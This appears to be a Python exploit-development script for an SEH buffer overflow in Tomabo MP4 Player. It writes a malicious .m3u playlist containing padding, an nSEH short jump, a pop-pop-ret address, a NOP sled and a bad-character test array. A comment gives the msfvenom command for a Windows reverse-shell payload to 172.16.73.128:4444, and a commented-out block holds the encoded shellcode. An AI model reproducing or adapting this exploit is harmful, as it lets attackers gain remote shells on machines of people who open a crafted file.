#!/usr/bin/python
 
# How to: Run the code and open the m3u file with the Vulnerable MP4 Player by Tomabo
# Bad Character = '\x00\x09\x0a\x0b\x0c\x0d\x1a\x20'
# msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=172.16.73.128 LPORT=4444 -e x86/shikata_ga_nai -b "" -i 3 -f c
 
file ="tomabo_SEH_nseh_ppr_badchars.m3u"
 
buf = "A"*1028
buf += "\xeb\x06\x90\x90"
buf += "\x9B\x97\xCA\x4E"
buf += "\x90"*16
buf += ("\x01\x02\x03\x04\x05\x06\x07\x08\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1b\x1c\x1d\x1e\x1f"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
buf += "D" * (2000 - len(buf))

'''
buf += ("\xbe\x54\x81\x76\x95\xda\xd5\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x5f\x83\xe8\xfc\x31\x70\x10\x03\x70\x10\xb6\x74\xcc\xbc\xd6"
"\xfb\xb5\x65\xcf\xdd\xc2\xbd\x1b\x85\x19\x77\x52\x6e\x6f\xd7"
"\x81\x8c\xdf\xc2\x2a\x7a\x23\x0e\xf0\x24\x61\x16\xfb\xa0\xfc"
"\x9b\x29\x5e\x41\x9a\x71\x86\xca\x05\xe7\x12\xc5\x7f\x7a\x57"
"\x37\x6d\xcc\xfa\x2a\xb2\x43\x2d\x24\x82\x01\x89\x83\xb1\x21"
"\x04\xd7\xb2\x6c\xbd\xbf\xfa\x7c\x7a\x36\x34\xdf\x9a\x6d\x93"
"\x64\x9e\x9d\x61\x12\xb0\x32\x3f\x66\xd0\xb8\x92\x92\xff\x46"
"\x16\xf3\x39\x3e\x33\x4d\x3f\x0f\x7e\x0e\x5c\x53\xa1\xab\x78"
"\xba\x1c\x91\x51\x1f\x50\x95\x9f\x7a\x95\xd2\x23\x26\x89\x9c"
"\x2a\xd2\x65\x1e\x27\x36\x75\x60\x71\x87\x17\x6b\xa2\x05\xb8"
"\x5a\x42\xe7\xf0\xaf\x1e\x58\x6d\x49\x44\x91\x76\x48\xc5\xa2"
"\xb9\x6e\xa5\x76\x59\x92\xaf\x31\xd6\x46\x51\x90\x2e\x1d\xc9"
"\xaa\x34\xd5\xff\xad\x29\x8c\x60\x5b\xe4\xc1\x64\x42\xd8\xb6"
"\x57\x41\x85\x54\xa0\x82\xd7\xf4\xea\x32\xbb\x2c\xdc\x80\xeb"
"\xd3\xe1\x93\x2c\xa3\x3c\x91\x3c\x25\xf7\xbd\x6e\x61\x12\x0f"
"\xe3\x72\xef\xd0\xa1\x90\x7c\xee\x55\x2d\x38\xe5\x60\x9b\x1c"
"\xeb\x10\xc4\x64\x68\xe6\x38\x8e\x47\xc3\x66\xe0\x95\xf9\x29"
"\xe8\xb7\x85\xbe\x36\x56\x7c\x35\xd5\xc6\x02\x4c\xed\xea\x50"
"\x4c\x9f\x52\x73\x53\x62\x3a\x02\x2a\x32\x57\x83\xd2\x5f\xd8"
"\xa8\x7d\x66\xd4\xfe\xf3\xda\x64\xff\xce\x46\x04\xc0\x1c\x87"
"\xa4\xe9\xd4\x17\x80\xdd\x72\xc3\x15\x8d\x5c\x93\x05\xf1\x96"
"\x59\x33\xd2\x19\x98\xf8\x29\xe3\x48\x63\x06\xae\x38\x1c\x3c"
"\xce\x17\x85\x81\x4b\x0f\x1b\x2c\x17\xfb\x51\x52\x26\x53\x85"
"\xf4\x62\x01\x96\x3f\x8e\xe2\x80\xec\x43\x74\xd1\x90\x5e\xab"
"\xb6\xb1\xa5\x1f\xc0\x03\x01\x35\x05\xc1\xd3\x03\x48\x79\xb5"
"\xb0\x33\x5a\x12\x3b\xc3\xde\x19\x6f\xe7\x58\x30\x67\xd1\x1c")
'''

writeFile = open (file, "w")
writeFile.write(buf)
writeFile.close()
